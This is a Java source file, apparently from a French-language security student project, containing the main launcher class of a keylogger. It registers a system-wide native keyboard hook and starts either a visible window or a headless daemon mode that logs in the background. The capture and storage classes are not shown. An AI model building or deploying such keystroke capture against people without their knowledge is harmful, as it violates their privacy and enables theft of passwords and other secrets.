package com.project.m2ssi.keylogger;

import java.awt.EventQueue;
import java.io.IOException;
import java.lang.Thread.UncaughtExceptionHandler;
import java.util.ArrayList;
import java.util.List;

import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;

import net.zeddev.litelogger.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import com.project.m2ssi.KeyLoggerInterface;
import com.project.m2ssi.enregistreur.implementation.EnregistreurDeDonneesComposite;
import com.project.m2ssi.enregistreur.implementation.EnregistreursDeDonnees;

public final class KeyLogger implements UncaughtExceptionHandler {

	private final Logger enregistreur = Logger.getLogger(this);

	private KeyLoggerInterface KeyLoggerFrame = null;
	
	private final EnregistreurDeDonneesComposite enregistreurDeDonneesComposite = new EnregistreurDeDonneesComposite();

	private final List<String> enregistreurTypes = new ArrayList<String>();
	
	private boolean runn = true;
	
	private void die() {
		System.exit(1);
	}

	private void ajouterArretCrochet() {

		Runtime.getRuntime().addShutdownHook(new Thread() {

			@Override
			public void run() {
				fermer();
			}

		});

	}
	
	private void fermer() {

		if (KeyLoggerFrame != null)
			KeyLoggerFrame.fermer();

		if (GlobalScreen.isNativeHookRegistered()){
			try {
				GlobalScreen.unregisterNativeHook();
			} catch (NativeHookException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	@Override
	public void uncaughtException(Thread thread, Throwable ex) {

	}
	
	private void init(String[] args) {

		ajouterArretCrochet();

		Thread.setDefaultUncaughtExceptionHandler(this);

		System.setProperty("awt.useSystemAAFontSettings", "on");
		System.setProperty("swing.aatext", "true");
		
		try {

			for (UIManager.LookAndFeelInfo info : UIManager.getInstalledLookAndFeels()) {
				
				if ("Nimbus".equals(info.getName())) {
					UIManager.setLookAndFeel(info.getClassName());
					break;
				}
				
			}

		} catch (ClassNotFoundException |
				 InstantiationException |
				 IllegalAccessException |
				 UnsupportedLookAndFeelException ex) {

			enregistreur.error("Impossible de définir GUI look and feel.", ex);

		}

	}

	private void initNativeHook() {

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException ex) {
			enregistreur.fatal("Incapable d'obtenir crochet natif!", ex);
			die();
		}

	}
	
	private void initenregistreurDeDonneesComposite() {
		
		for (String type : enregistreurTypes) {
			
			try {
				enregistreurDeDonneesComposite.ajouterEnregistreur(
					EnregistreursDeDonnees.newDataLogger(type)
				);
				
			} catch (IOException ex) {
				enregistreur.error("erreur de l'ajout %s.", ex, type);
			}
			
		}
		
	}
	
	
	
	private void startGui() {

		EventQueue.invokeLater(new Runnable() {
			public void run() {

				initNativeHook();
				
				initenregistreurDeDonneesComposite();
				KeyLoggerFrame = new KeyLoggerInterface(enregistreurDeDonneesComposite);
				KeyLoggerFrame.setVisible(true);
				
			}
		});

	}
	
	private void runDaemon() {
		
		initNativeHook();
		
		initenregistreurDeDonneesComposite();
		
		while (true) {
			try {
				Thread.sleep(100);
			} catch (InterruptedException ex) {
				
			}
			
		}
		
	}
	
	private void start() {
		
		if (runn) {
			startGui();
		} else {
			runDaemon();
		}
		
	}

	public static void main(String[] args) {

		KeyLogger keyLogger = new KeyLogger();
		
		keyLogger.init(args);
		keyLogger.start();
		keyLogger.fermer();
		
	}

}
